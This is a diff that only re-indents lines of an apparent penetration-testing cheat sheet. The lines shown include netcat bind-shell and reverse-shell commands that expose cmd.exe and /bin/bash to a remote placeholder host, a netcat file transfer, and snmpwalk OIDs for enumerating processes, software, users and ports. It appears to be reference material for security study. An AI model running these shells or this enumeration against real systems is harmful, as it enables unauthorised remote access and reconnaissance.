@@ -34,17 +34,17 @@ nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>
 
 Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:
 
-(BOB): nc -nlvp <[PORT]> -e cmd.exe
+	(BOB): nc -nlvp <[PORT]> -e cmd.exe
 
-(ALICE): nc -nv <[BOB_IP]> <[PORT]>
+	(ALICE): nc -nv <[BOB_IP]> <[PORT]>
 
 <b>Reverse Shell:</b>
 
 Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:
 
-(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
+	(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
 
-(BOB): nc -nlvp <[PORT]>
+	(BOB): nc -nlvp <[PORT]>
 
 # Zone Transfer
 
@@ -84,19 +84,19 @@ snmpwalk -c public -v1 <[IP]> <mib-values>
 
 Mib-values (for snmpwalk):
 
-1.3.6.1.2.1.25.1.6.0 System Processes
+	1.3.6.1.2.1.25.1.6.0 System Processes
 
-1.3.6.1.2.1.25.4.2.1.2 Running Programs
+	1.3.6.1.2.1.25.4.2.1.2 Running Programs
 
-1.3.6.1.2.1.25.4.2.1.4 Processes Path
+	1.3.6.1.2.1.25.4.2.1.4 Processes Path
 
-1.3.6.1.2.1.25.2.3.1.4 Storage Units
+	1.3.6.1.2.1.25.2.3.1.4 Storage Units
 
-1.3.6.1.2.1.25.6.3.1.2 Software Name
+	1.3.6.1.2.1.25.6.3.1.2 Software Name
 
-1.3.6.1.4.1.77.1.2.25 User
+	1.3.6.1.4.1.77.1.2.25 User
 
-1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+	1.3.6.1.2.1.6.13.1.3 TCP Local Ports
 
 
 
